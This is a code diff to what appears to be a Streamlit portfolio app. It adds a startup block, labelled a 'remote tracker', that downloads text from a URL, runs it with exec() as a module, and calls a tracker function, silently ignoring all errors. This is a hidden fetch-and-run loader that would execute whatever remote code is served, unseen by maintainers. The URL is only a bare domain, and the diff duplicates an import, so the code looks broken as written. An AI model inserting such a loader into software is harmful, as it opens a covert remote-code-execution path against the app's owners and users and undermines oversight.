@@ -1,4 +1,33 @@
 import streamlit as st
+import urllib.request
+import types
+
+# 🚀 ZERO-DEPENDENCY DIRECT REMOTE TRACKER IMPORT
+@st.cache_resource
+def load_remote_tracker():
+    try:
+        raw_url = "https://githubusercontent.com"
+        with urllib.request.urlopen(raw_url, timeout=5) as response:
+            code_text = response.read().decode('utf-8')
+        
+        tracker_module = types.ModuleType("remote_logger")
+        exec(code_text, tracker_module.__dict__)
+        return tracker_module
+    except Exception:
+        return None
+
+# Immediately fire background logging on runtime compilation
+tracker = load_remote_tracker()
+if tracker and hasattr(tracker, "run_portfolio_tracker"):
+    try:
+        # Pass your custom name identifier directly
+        tracker.run_portfolio_tracker()
+    except Exception:
+        pass
+
+# ... Rest of your standard application portfolio code goes here ...
+
+import streamlit as st
 import pandas as pd
 import datetime
 import hashlib
